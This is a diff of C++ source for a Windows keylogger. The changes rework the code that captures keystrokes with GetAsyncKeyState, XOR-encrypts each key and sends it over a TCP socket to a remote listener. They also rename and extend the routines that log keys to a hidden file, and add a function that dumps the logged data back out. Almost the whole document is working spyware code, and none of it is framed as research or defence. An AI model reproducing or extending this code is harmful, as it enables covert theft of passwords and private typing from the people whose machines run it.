@@ -11,7 +11,7 @@ Keylogger::Keylogger()
 
 VOID Keylogger::setup()
 {
-    
+    wcout << "setup called " <<endl;
     DWORD dwProcessId;
     a_WindowHandle =  GetForegroundWindow(); //Récupère un handle vers la fenêtre de premier plan
     a_dwThreadId = GetWindowThreadProcessId(a_WindowHandle, &dwProcessId); //Récupère l'identifiant du thread qui a créé la fenêtre spécifiée
@@ -177,43 +177,144 @@ VOID Keylogger::directTcp()
 {
     HANDLE threads[1];
 
-    wcout << "In startThread " << endl;
+    wcout << "In directTcp " << endl;
 
-    threads[0] = CreateThread(NULL,0 ,sendKeystrokeThread ,&a_sock ,0 ,NULL); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
-    threads[1] = CreateThread(NULL,0 ,recvDataThread ,&a_sock ,0 ,NULL);
-
-    //WaitForMultipleObjects(1,threads, TRUE, INFINITE); //https://stackoverflow.com/questions/43298052/windows-c-tcp-socket-sendrecv-at-the-same-time
+    threads[0] = CreateThread(NULL,0 ,sendKeystrokeThread ,this ,0 ,NULL); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
+    threads[1] = CreateThread(NULL,0 ,recvDataThread ,this ,0 ,NULL);
     
     WaitForSingleObject(threads[1], INFINITE);
-    
-    TerminateThread(threads[0], 0); //Once the first thread is finished, finish the second. 
+  
+    wcout << "stat directSendKeystrokeRunning: " << directSendKeystrokeRunning << endl;
+    directSendKeystrokeRunning = FALSE; // kill  sendKeystrokeThread theard.
 
     CloseHandle(threads[0]);
     CloseHandle(threads[1]);
+
+    threads[0] = NULL;
+    threads[1] = NULL;
+
+}
+
+
+DWORD WINAPI Keylogger::sendKeystrokeThread (LPVOID param) 
+{
+    Keylogger* This = (Keylogger *) param;
+    This->directSendKeystroke();
+    return 0;
+}
+
+
+VOID Keylogger::directSendKeystroke() //for directTcp
+{   
+    wstring unicode_char;
+    directSendKeystrokeRunning = TRUE;
+    INT status=0;
+
+    wcout <<"in directSendKeystroke"  << endl;
+    while (directSendKeystrokeRunning)
+    {
+        Sleep(20);
+    
+        for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
+        {
+            if(GetAsyncKeyState(keystroke) == -32767)
+            {
+                wcout << keystroke << endl;
+                if((keystroke>=39)&&(keystroke<91))
+                {
+                    //not SpecialKey
+                    unicode_char = intToUnicode(keystroke);
+                }
+                else
+                {
+                    unicode_char = specialKey(keystroke);
+                }
+                wcout << unicode_char << endl;
+                wcout << directSendKeystrokeRunning << endl;
+                status = send(a_sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
+                if(status == SOCKET_ERROR)
+                {
+                    wcout << "\nerror in socket ...\n" << endl;
+                    wcout << GetLastError() << endl;
+                    directSendKeystrokeRunning = FALSE;
+                } 
+            }
+        }
+    }
+    wcout << "stop while directSendKeystrokeRunning" << endl;
+}
+
+
+DWORD WINAPI Keylogger::recvDataThread(LPVOID param)
+{
+    Keylogger* This = (Keylogger *) param;
+    This->directRecvData();
+    return 0;
+}
+
+
+VOID Keylogger::directRecvData()//waits to receive an end-of-connection message  for directTcp | for directTcp
+{
+
+    WCHAR buff[512]={0};
+    INT status;
+    while(TRUE)
+    {
+        status = recv(a_sock, (CHAR *)buff, sizeof(buff), 0);
+        if(status == SOCKET_ERROR)
+        {
+            wcout << "SOCKET_ERROR" << endl;
+            break;
+        }
+        else if (XOREncryption( (wstring) buff) == L"\r\n")
+        {
+            break;
+        }
+        wcout << buff << endl;
+
+        ZeroMemory(&buff, sizeof(buff));
+    }
+    wcout << "stop thread baby !" << endl;
 }
 
 
 //-------------------------------------------------------------------------------------------------------------------
-INT Keylogger::silenciousBackground()//return 1 if error
+
+INT Keylogger::silenciousStop()//return 1 if error
+{
+    /*returns 0 if the method is well executed.
+    returns 1 if the silencious thread is not started. 
+    */
+   if(silenciousBackgroundRunning)
+   {
+        //silencious thread is not started. 
+        return 1;   
+   }
+
+    silenciousBackgroundRunning = FALSE;
+    return 0;
+}
+
+
+INT Keylogger::silenciousStart()//return 1 if error
 {
     /*
     Algo:
-    1- (createHideFileAndHideFile)
+    1- (silenciousCreateFileAndHideFile)
         1.1- Test if exist.
         1.2- Set handle of the a_file_name.
         1.3- Hide a_file_name.
-    2- (StaticThreadStart) Start thread.
-        2.1- (keyboardListeningAndWriteFile)
-        2.2- (writeKeystrokeInFile)
+    2- (silenciousThread) Start thread.
+        2.1- (silenciousKeyboardListeningAndWriteFile)
+            2.1.1- (silenciousWriteKeystrokeInFile)
     */
-   if(createHideFileAndHideFile())
+   if(silenciousCreateFileAndHideFile())
    {
        //if error
         return 1;
    }
     HANDLE hThread  = CreateThread(NULL,0 ,silenciousThread ,this ,0 ,NULL);
-    WaitForSingleObject(hThread, INFINITE); //just for test
-    
+    //WaitForSingleObject(hThread, INFINITE); //just for test
     return 0;
 }
 
@@ -221,20 +322,20 @@ INT Keylogger::silenciousBackground()//return 1 if error
 DWORD WINAPI Keylogger::silenciousThread(LPVOID param) //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
 {
     Keylogger* This = (Keylogger *) param;
-    //setup ?????
+
     wcout << "Handler in staticThreadStart: " << This->a_hFile << endl;
-    This->keyboardListeningAndWriteFile(This->a_hFile);
+    This->silenciousKeyboardListeningAndWriteFile(This->a_hFile);
 
     return 0;
 }
 
 
-VOID Keylogger::keyboardListeningAndWriteFile(CONST HANDLE &hFile)
+VOID Keylogger::silenciousKeyboardListeningAndWriteFile(CONST HANDLE &hFile)
 {
     wcout << "Handle keyboardListeningAndWriteFile: " <<hFile << endl;
     wstring unicode_char;
-
-    while(TRUE)
+    silenciousBackgroundRunning = TRUE;
+    while(silenciousBackgroundRunning)
     {  
         for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
         {
@@ -253,15 +354,15 @@ VOID Keylogger::keyboardListeningAndWriteFile(CONST HANDLE &hFile)
                 }
                 wcout << "char: "<<unicode_char << endl;
 
-                //writeKeystrokeInFile(XOREncryption(unicode_char), hFile);
-                writeKeystrokeInFile(unicode_char, hFile);
+                silenciousWriteKeystrokeInFile(XOREncryption(unicode_char), hFile);
+                //silenciousWriteKeystrokeInFile(unicode_char, hFile);
             }
         }
     }
 }
 
 
-INT Keylogger::createHideFileAndHideFile() //return 1 if error
+INT Keylogger::silenciousCreateFileAndHideFile() //return 1 if error
 {
     HANDLE hFile; //use in CreateFile and WriteFile
     BOOL status; // use in WriteFile
@@ -306,7 +407,7 @@ INT Keylogger::createHideFileAndHideFile() //return 1 if error
 }
 
 
-VOID Keylogger::writeKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile)
+VOID Keylogger::silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile)
 {
     WriteFile(          //https://stackoverflow.com/questions/28618715/c-writefile-unicode-characters
         hFile,           // open file handle
@@ -317,6 +418,27 @@ VOID Keylogger::writeKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFi
     wcout << "write file good or not ? "<< GetLastError() << endl;
 }
 
+
+vector <string> Keylogger::dumpAllData()
+{
+    CHAR chBuff[4096];
+    vector<string> result;
+    DWORD NumberOfBytesRead;
+
+    while(TRUE) //Read buffer of anonymous pipe and append the result in result_of_command
+    {
+        if(!ReadFile(a_hFile, &chBuff, sizeof(chBuff) ,&NumberOfBytesRead,NULL))
+        {
+            wcout << "stoppp" << endl;
+            break;
+        }
+        wcout << chBuff << endl;// WARNING !!!!!!!!!!!!!!!
+        //Sleep(20);
+        result.push_back((string)chBuff);
+        ZeroMemory(&chBuff, strlen(chBuff));
+    }
+    return result;
+}
 
 //-------------------------------------------------------------------------------------------------------------------
 HANDLE Keylogger::gethFile()
@@ -330,66 +452,3 @@ Keylogger::~Keylogger()
 
 
 //----------------------------------------------------------------------------------
-DWORD WINAPI sendKeystrokeThread(LPVOID param) //for directTcp
-{   
-    SOCKET sock = *(SOCKET *)param;
-    wstring unicode_char;
-    
-    Keylogger keylogger;
-    keylogger.setup();
-
-    while (true)
-    {
-        Sleep(20);
-    
-        for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
-        {
-            if(GetAsyncKeyState(keystroke) == -32767)
-            {
-                cout << keystroke << endl;
-                if((keystroke>=39)&&(keystroke<91))
-                {
-                    //not SpecialKey
-                    unicode_char = keylogger.intToUnicode(keystroke);
-                }
-                else
-                {
-                    unicode_char = keylogger.specialKey(keystroke);
-                }
-                wcout << "char: "<<unicode_char << endl;
-            }
-            wcout << "send char: "<<unicode_char << endl;
-            send(sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
-        }
-    }
-    return 0;
-}
-
-
-DWORD WINAPI recvDataThread(LPVOID param)//waits to receive an end-of-connection message  for directTcp | for directTcp
-{
-    SOCKET sock = *(SOCKET *)param;
-
-    WCHAR buff[512]={0};
-
-    while(TRUE)
-    {
-        INT stat = recv(sock, (CHAR *)buff, sizeof(buff), 0);
-        if(stat == SOCKET_ERROR)
-        {
-            wcout << "SOCKET_ERROR" << endl;
-            break;
-        }
-        else if (XOREncryption( (wstring) buff) == L"\r\n")
-        {
-            break;
-        }
-        wcout << buff << endl;
-
-        ZeroMemory(&buff, sizeof(buff));
-    }
-
-    wcout << "stop thread baby !" << endl;
-    return 0;
-}
-
